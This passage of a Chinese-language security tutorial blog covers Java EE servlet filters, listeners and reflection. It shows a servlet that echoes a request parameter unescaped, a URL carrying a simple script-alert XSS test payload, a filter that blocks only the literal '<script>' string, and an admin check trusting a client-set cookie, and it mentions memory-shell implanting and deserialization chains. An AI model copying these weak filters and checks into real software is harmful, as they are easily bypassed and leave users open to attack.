class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/index&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 从请求中获取名为“code”的参数值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取用于将输出发送会客户端的 PrintWriter 对象</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 “code” 参数的值打印到客户端</span></span><br><span class="line">        out.println(code);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 刷新 PrintWriter，确保立即发送任何缓冲的内容</span></span><br><span class="line">        out.flush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭 PrintWriter 以释放资源</span></span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/img/xiaodi/image-20250519192328824.png" alt="image-20250519192328824"></p>
<p>存在一定的XSS危险</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/demo1_war_exploded/index?code=%3Cscript%3Ealert(1)%3C/script%3E</span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250519192531295.png" alt="image-20250519192531295"></p>
<h3 id="创建过滤器"><a href="#创建过滤器" class="headerlink" title="创建过滤器"></a>创建过滤器</h3><ul>
<li>在对应的filter下创建<code>XssFilter</code></li>
</ul>
<h4 id="过滤器内置方法"><a href="#过滤器内置方法" class="headerlink" title="过滤器内置方法"></a>过滤器内置方法</h4><p>并实现Filter 接口中的所有方法</p>
<p>init doFilter destroy </p>
<p>1、init(FilterConfig filterConfig): </p>
<ul>
<li>该方法在过滤器被初始化时调用，只会执行一次。</li>
<li>用于执行一些初始化操作，例如获取配置信息等。</li>
</ul>
<p>2、doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain): </p>
<ul>
<li>这是过滤器的主要方法，在每次请求被过滤时都会调用。 	</li>
<li>doFilter 方法中的 filterChain.doFilter(request, response) 表示继续执行过滤器链，如果没有更多的过滤器，最终将调用目标资源（例如 Servlet 或 JSP）。</li>
<li>如果在 doFilter 中不调用 filterChain.doFilter，则请求将被拦截，不会继续传递。</li>
</ul>
<p>3、destroy():</p>
<ul>
<li>该方法在过滤器被销毁时调用，只会执行一次。</li>
<li>用于执行一些清理工作，释放资源等。</li>
</ul>
<p>XssFilter.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/index&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 中间件启动后就自动运行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;xss开始过滤&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 访问路由触发的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;xss is filter&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 过滤代码就应该在放行前</span></span><br><span class="line">        <span class="comment">// 如果符合就放行，不符合就过滤（拦截）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// XSS过滤 接受参数值 如果有攻击payload 就进行拦截</span></span><br><span class="line">        <span class="comment">// 接受参数值 如果没有攻击payload 就进行放行</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!code.contains(<span class="string">&quot;&lt;script&gt;&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;have xss hack&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 中间件关闭后就自动运行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;xss is destroy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>输入正常参数：</p>
<p><img src="/img/xiaodi/image-20250519202200223.png" alt="image-20250519202200223"></p>
<p><img src="/img/xiaodi/image-20250519202250729.png" alt="image-20250519202250729"></p>
<p>输入xss危险函数</p>
<p><img src="/img/xiaodi/image-20250519202324703.png" alt="image-20250519202324703"></p>
<p><img src="/img/xiaodi/image-20250519202346565.png" alt="image-20250519202346565"></p>
<h3 id="配置过滤器的触发"><a href="#配置过滤器的触发" class="headerlink" title="配置过滤器的触发"></a>配置过滤器的触发</h3><p><strong>注意：</strong></p>
<p>​	可以使用\demo1\src\main\webapp\WEB-INF\web.xml 配置触发器</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 第一种方法在xssFilter.java中配置 --&gt;</span></span><br><span class="line">@WebFilter(&quot;/index&quot;)</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第二种方法在web.xml中配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>xssFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.demo1.xssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>xssFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="利用过滤器简单实现：cookie身份验证"><a href="#利用过滤器简单实现：cookie身份验证" class="headerlink" title="利用过滤器简单实现：cookie身份验证"></a>利用过滤器简单实现：cookie身份验证</h3><p>1、创建servlet下创建AdminServlet</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;欢迎进入管理员页面&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>访问测试：</p>
<p><img src="/img/xiaodi/image-20250519203725545.png" alt="image-20250519203725545"></p>
<p>2、创建AdminFilter.java</p>
<p>①先不加入判断获取到浏览器本身的cookie值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init admin filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;doFilter admin filter&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测cookie</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对cookie进行遍历</span></span><br><span class="line">        <span class="keyword">for</span> (Cookie cookie : cookies) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cookie.getName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">            System.out.println(<span class="string">&quot;name:&quot;</span> + name + <span class="string">&quot;, value:&quot;</span> + value);</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>页面测试：</p>
<p><img src="/img/xiaodi/image-20250519204647689.png" alt="image-20250519204647689"></p>
<p>②加入cookie进行判断</p>
<ul>
<li>检查请求中是否包含<strong>名为 “user” 且值为 “admin”</strong> 的Cookie。如果符合条件，则放行请求；否则，输出 “非管理员访问”。</li>
<li>相应进入管理员页面，必须先在浏览器中添加对应判断的cookie值</li>
<li>如果对应不上则是非管理员访问，不予通过</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo1;</span><br><span class="line"></span><br><span class="line">import jakarta.servlet.*;</span><br><span class="line">import jakarta.servlet.annotation.WebFilter;</span><br><span class="line">import jakarta.servlet.http.Cookie;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebFilter(&quot;/admin&quot;)</span><br><span class="line">public class AdminFilter implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        System.out.println(&quot;init admin filter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        System.out.println(&quot;doFilter admin filter&quot;);</span><br><span class="line"></span><br><span class="line">        // 检测cookie</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) servletRequest;</span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line"></span><br><span class="line">        // 对cookie进行遍历</span><br><span class="line">        for (Cookie cookie : cookies) &#123;</span><br><span class="line">            String name = cookie.getName();</span><br><span class="line">            String value = cookie.getValue();</span><br><span class="line">            System.out.println(&quot;name:&quot; + name + &quot;, value:&quot; + value);</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line"></span><br><span class="line">            // 检查是否包含名为 &quot;user&quot; 且值为 &quot;admin&quot; 的Cookie</span><br><span class="line">            if (name.contains(&quot;admin&quot;) &amp;&amp; value.contains(&quot;admin&quot;)) &#123;</span><br><span class="line">                // 是管理员，放行请求</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;else  &#123;</span><br><span class="line">                // 非管理员，可以根据需求添加相应的处理逻辑，例如重定向到登录页等</span><br><span class="line">                System.out.println(&quot;not admin&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">        System.out.println(&quot;destroy admin filter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>①不设置cookie访问</p>
<p><img src="/img/xiaodi/image-20250519205723737.png" alt="image-20250519205723737"></p>
<p>②设置cookie值进行访问</p>
<p>F12 -&gt;application -&gt; cookie</p>
<p><img src="/img/xiaodi/image-20250519205833316.png" alt="image-20250519205833316"></p>
<p><img src="/img/xiaodi/image-20250519205912578.png" alt="image-20250519205912578"></p>
<h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>Payload检测，权限访问控制，红队内存马植入，蓝队清理内存马等<br>内存马参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hev4G1FivLtqKjt0VhHKmw">https://mp.weixin.qq.com/s/hev4G1FivLtqKjt0VhHKmw</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/274466.html">一文看懂内存马 - FreeBuf网络安全行业门户</a></p>
<h2 id="JavaEE-监听器-Listen"><a href="#JavaEE-监听器-Listen" class="headerlink" title="JavaEE-监听器-Listen"></a>JavaEE-<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%9B%91%E5%90%AC%E5%99%A8&spm=1001.2101.3001.7020">监听器</a>-Listen</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/2d5c66415d249d0da040f94930ee3bfe.png" alt="Untitled"></p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52797170/article/details/124023760">https://blog.csdn.net/qq_52797170/article/details/124023760</a></p>
<p>监听ServletContext、HttpSession、ServletRequest等域对象创建和销毁事件<br>监听域对象的属性发生修改的事件<br>监听在事件发生前、发生后做一些必要的处理</p>
<h3 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h3><p><img src="/img/xiaodi/ee9929f1cc799556aec274a4bd9df112.png" alt="Untitled"></p>
<ul>
<li><p>创建新的项目ListenDemo1</p>
</li>
<li><p>在servlet下创建CSession DSession，并进行检测</p>
</li>
</ul>
<p>DSession一个简单的Servlet，对应一个&#x2F;ds的URL映射。在收到GET请求时，它会销毁当前请求的HttpSession。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/ds&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DSession</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Servlet里面销毁Session&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 销毁Session</span></span><br><span class="line">        req.getSession().invalidate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><p>@WebServlet(“&#x2F;ds”): 通过此注解，指定了Servlet的URL映射为 “&#x2F;ds”。</p>
</li>
<li><p>System.out.println(“Servlet里面销毁Session”);: 打印一条日志，说明Servlet正在销毁Session。</p>
</li>
<li><p>req.getSession().invalidate();: 获取当前请求的HttpSession，并调用invalidate()方法使其失效，从而销毁Session。这通常会导致用户在当前会话中的状态丢失，因为Session被销毁了。</p>
</li>
</ul>
<p>这段代码是一个简单的Servlet，对应一个 <code>/cs</code> 的URL映射。在收到GET请求时，它会创建一个新的<code>HttpSession</code>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@WebServlet(&quot;/cs&quot;)</span><br><span class="line">public class CSession extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Servlet里面创建Session&quot;);</span><br><span class="line"></span><br><span class="line">        // 创建Session</span><br><span class="line">        req.getSession();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="监听器内置方法"><a href="#监听器内置方法" class="headerlink" title="监听器内置方法"></a>监听器内置方法</h3><p>这段代码定义了一个实现 <code>HttpSessionListener</code> 接口的监听器类 <code>ListenSession</code>，用于监听<code>HttpSession</code>的创建和销毁事件。</p>
<p>下面是对代码的注释：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@WebListener</span><br><span class="line">public class ListenSession implements HttpSessionListener &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void sessionCreated(HttpSessionEvent se) &#123;</span><br><span class="line">        // 监听检测有Session创建就会执行这里</span><br><span class="line">        System.out.println(&quot;监听器监听到了session创建&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void sessionDestroyed(HttpSessionEvent se) &#123;</span><br><span class="line">        // 监听检测有Session销毁就会执行这里</span><br><span class="line">        System.out.println(&quot;监听器监听到了session销毁&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>@WebListener: 通过此注解，标记这是一个监听器类。</p>
</li>
<li><p>@Override 注解用于表示下面的方法是对接口中方法的重写。</p>
</li>
<li><p>public void sessionCreated(HttpSessionEvent se): 当有新的 HttpSession 被创建时，这个方法会被调用。在这里，它简单地输出一条日志表示监听器检测到了session的创建。</p>
</li>
<li><p>public void sessionDestroyed(HttpSessionEvent se): 当一个 HttpSession 被销毁时，这个方法会被调用。在这里，它简单地输出一条日志表示监听器检测到了session的销毁。</p>
</li>
</ul>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/eb83e737239f2da02d576d7e557d1c76.png" alt="Untitled"></p>
<h4 id="监听器触发流程"><a href="#监听器触发流程" class="headerlink" title="监听器触发流程"></a>监听器触发流程</h4><p>在Java Web应用中，监听器用于监控和响应特定的事件。对于监听器的触发流程，以下是一般的步骤：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@WebListener</span><br><span class="line">&lt;listener&gt;</span><br><span class="line">.......</span><br><span class="line">&lt;/listener&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注册监听器：<br>    在Web应用中，你需要将监听器注册到相应的组件上。例如，在web.xml文件中配置监听器，或者使用注解（如@WebListener）标记监听器类。<br>事件发生：<br>    当与监听器关联的特定事件在Web应用中发生时，监听器会被触发。<br>调用监听器方法：<br>    监听器类中实现的相应方法（如sessionCreated、sessionDestroyed等）将被调用。这些方法包含与事件相关的信息，允许监听器执行特定的逻辑。<br>执行自定义逻辑：<br>    在监听器方法中，你可以编写自定义的逻辑以响应事件。这可能包括记录日志、修改数据、发送通知等。</p>
<p>举例来说，对于HttpSessionListener：</p>
<p>当一个新的HttpSession被创建时，sessionCreated方法将被调用。<br>当一个HttpSession被销毁时，sessionDestroyed方法将被调用。</p>
<p>总的来说，监听器提供了一种在Web应用中对特定事件进行响应的机制，使开发者能够以声明性的方式处理应用的生命周期事件。</p>
<h3 id="监听器安全场景"><a href="#监听器安全场景" class="headerlink" title="监听器安全场景"></a>监听器安全场景</h3><p>代码审计中分析执行逻辑触发操作，红队内存马植入，蓝队清理内存马等</p>
<h1 id="JavaEE应用-反射机制-攻击链-类对象-成员变量方法-构造方法"><a href="#JavaEE应用-反射机制-攻击链-类对象-成员变量方法-构造方法" class="headerlink" title="JavaEE应用&amp;反射机制&amp;攻击链&amp;类对象&amp;成员变量方法&amp;构造方法"></a>JavaEE应用&amp;反射机制&amp;攻击链&amp;类对象&amp;成员变量方法&amp;构造方法</h1><h2 id="反射中的类名-变量-方法"><a href="#反射中的类名-变量-方法" class="headerlink" title="反射中的类名&amp;变量&amp;方法"></a>反射中的类名&amp;变量&amp;方法</h2><p><img src="/img/xiaodi/c3cc8868e7bdd4b135b8ddc210cd5cb9.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/87dab2f6cddd83f4bc29f15b7e3c2d79.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/8cb1c813b193d8e925b10c2b080a9298.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/53a3ff45af64226548a4e65689739c45.png" alt="Untitled"></p>
<h2 id="反射概念"><a href="#反射概念" class="headerlink" title="反射概念"></a>反射概念</h2><p>1、什么是Java反射</p>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p>
<p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法&#x2F;访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p>
<p>2、反射的作用</p>
<p>在运行时获得<strong>程序</strong>或<strong>程序集</strong>中每一个类型的<strong>成员和成员的信息</strong>，从而<strong>动态的创建、修改、调用、获取其属性</strong>，而<strong>不需要事先知道运行的对象是谁</strong>。</p>
<p>​	<strong>不改变原有代码逻辑，自行运行的时候动态创建和编译即可</strong></p>
<p>3、利用场景</p>
<blockquote>
<p>构造利用链，触发命令执行<br><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>中的利用链构造<br>动态获取或执行任意类中的属性或方法<br>动态代理的底层原理是反射技术<br>rmi反序列化也涉及到反射操作</p>
